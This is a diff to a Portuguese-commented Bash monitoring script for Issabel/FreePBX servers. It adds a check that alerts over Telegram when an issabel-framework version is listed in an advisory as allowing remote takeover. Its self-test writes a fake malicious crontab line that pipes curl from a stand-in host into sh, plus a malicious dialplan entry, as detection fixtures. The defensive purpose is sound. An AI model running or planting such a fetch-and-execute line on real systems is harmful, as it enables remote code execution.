@@ -17,7 +17,8 @@
 #  4. Contas e senhas: avisa se surgir usuario novo, senha alterada ou removido no
 #     painel (acl.db), FreePBX (ampusers), MySQL e arquivos /etc/*.conf de credenciais.
 #  5. Host (a cada minuto, leve): firewall caiu (alerta e reativa), dialplan malicioso
-#     (thanku-outcall) e crontab suspeito de asterisk/root (so alerta).
+#     (thanku-outcall), crontab suspeito de asterisk/root e issabel-framework
+#     vulneravel (aviso oficial 08/2026): so alertam.
 #  6. Autoprotecao: watchdog restaura o proprio Sentinel/cron se forem apagados.
 #  7. Para cada achado de arquivo: move para QUARENTENA (reversivel), avisa no Telegram com
 #     data/hora, arquivo e IP de origem (quando aparece no log do Apache).
@@ -359,7 +360,30 @@ check_cron() {
   send_telegram "ALERTA: CRONTAB SUSPEITO - ${HOSTNAME_S}"$'\n'"$(date '+%d/%m/%Y %H:%M:%S')${msg}"$'\n\n'"Nada foi alterado. Revise com: crontab -l -u asterisk"
 }
 
-host_checks() { check_firewall; check_dialplan; check_cron; }
+# Aviso oficial Issabel (02/08/2026): issabel-framework <= 4.0.0-12 (Issabel 4) ou <= 5.0.0-3
+# (Issabel 5) permite controle remoto. So ALERTA (uma vez por versao); nao atualiza sozinho.
+check_framework() {
+  local v="${SENTINEL_FRAMEWORK_VER:-}" ver rel major lim_rel fix vuln=0
+  if [ -z "$v" ]; then
+    command -v rpm >/dev/null 2>&1 || return 0
+    v="$(rpm -q --qf '%{VERSION}-%{RELEASE}' issabel-framework 2>/dev/null)" || return 0
+  fi
+  case "$v" in [0-9]*-*) ;; *) return 0 ;; esac
+  ver="${v%%-*}"; rel="${v#*-}"; rel="${rel%%[!0-9]*}"; rel="${rel:-0}"; major="${ver%%.*}"
+  case "$major" in
+    4) lim_rel=12; fix='yum --disablerepo=* --enablerepo=issabel-updates update issabel-framework' ;;
+    5) lim_rel=3;  fix='yum --disablerepo=* --enablerepo=issabel-cinco-updates update issabel-framework' ;;
+    *) return 0 ;;
+  esac
+  if [ "$ver" = "$major.0.0" ]; then [ "$rel" -le "$lim_rel" ] && vuln=1
+  elif [ "$(printf '%s\n%s\n' "$ver" "$major.0.0" | sort -V | head -1)" = "$ver" ]; then vuln=1; fi
+  [ "$vuln" = "1" ] || return 0
+  seen_once "framework|$v" || return 0
+  log "FRAMEWORK vulneravel: issabel-framework ${v}"
+  send_telegram "ALERTA: ATUALIZACAO DE SEGURANCA PENDENTE - ${HOSTNAME_S}"$'\n'"$(date '+%d/%m/%Y %H:%M:%S')"$'\n'"issabel-framework ${v} tem falha critica (aviso oficial de 02/08/2026) que permite controle remoto do servidor."$'\n\n'"Atualize (com backup/snapshot antes): ${fix}"$'\n'"Se suspeitar de invasao, a atualizacao NAO remove malware ja instalado: rode ipbx-sentinel --scan."
+}
+
+host_checks() { check_firewall; check_dialplan; check_cron; check_framework; }
 
 do_scan() {
   local mode="$1"
@@ -452,12 +476,12 @@ cmd_selftest() {
   printf '#!/bin/bash\ncase "$1" in is-enabled) exit 0;; is-active) echo inactive; exit 3;; *) exit 0;; esac\n' > "$T/bin/systemctl"; chmod +x "$T/bin/systemctl"
   echo 'exten => s,1,Goto(thanku-outcall,s,1)' > "$T/extensions_custom.conf"
   echo '* * * * * curl http://exemplo.invalido/x | sh' > "$T/cron/asterisk"
-  ( PATH="$T/bin:$PATH" WEB_DIR="$T/web" SENTINEL_QUAR="$T/quar" SENTINEL_LOG="$T/log" SENTINEL_NO_ALERT=1 SENTINEL_CONF=/nonexistent SENTINEL_ALLOW=/nonexistent SENTINEL_STATE="$T/state" SENTINEL_ACL_DB=/nonexistent SENTINEL_CRED_FILES="" SENTINEL_FIREWALL_HEAL=0 SENTINEL_DIALPLAN_GLOB="$T/extensions*.conf" SENTINEL_CRON_DIR="$T/cron" "$0" --scan >/dev/null 2>&1 )
+  ( PATH="$T/bin:$PATH" WEB_DIR="$T/web" SENTINEL_QUAR="$T/quar" SENTINEL_LOG="$T/log" SENTINEL_NO_ALERT=1 SENTINEL_CONF=/nonexistent SENTINEL_ALLOW=/nonexistent SENTINEL_STATE="$T/state" SENTINEL_ACL_DB=/nonexistent SENTINEL_CRED_FILES="" SENTINEL_FIREWALL_HEAL=0 SENTINEL_DIALPLAN_GLOB="$T/extensions*.conf" SENTINEL_CRON_DIR="$T/cron" SENTINEL_FRAMEWORK_VER="4.0.0-12" "$0" --scan >/dev/null 2>&1 )
   chk() { if [ "$2" = "gone" ] && [ ! -e "$1" ]; then ok=$((ok+1)); elif [ "$2" = "kept" ] && [ -e "$1" ]; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: $1 deveria estar '$2'"; fi; }
   chk "$T/web/modules/a_emad.php" gone;  chk "$T/web/modules/b_chain.php" gone;  chk "$T/web/modules/c_decode.php" gone
   chk "$T/web/images/d_static.php" gone; chk "$T/web/admin/modules/phones" gone
   chk "$T/web/modules/legitimo.php" kept; chk "$T/web/admin/libraries/php-upgrade/compat.php" kept; chk "$T/web/admin/modules/core/XML_Unserializer.php" kept
-  for k in "FIREWALL: iptables fora do ar" "DIALPLAN malicioso" "CRON suspeito"; do
+  for k in "FIREWALL: iptables fora do ar" "DIALPLAN malicioso" "CRON suspeito" "FRAMEWORK vulneravel"; do
     if grep -qF "$k" "$T/log"; then ok=$((ok+1)); else bad=$((bad+1)); echo "FALHA: alerta '$k' nao gerado"; fi
   done
   rm -rf "$T"
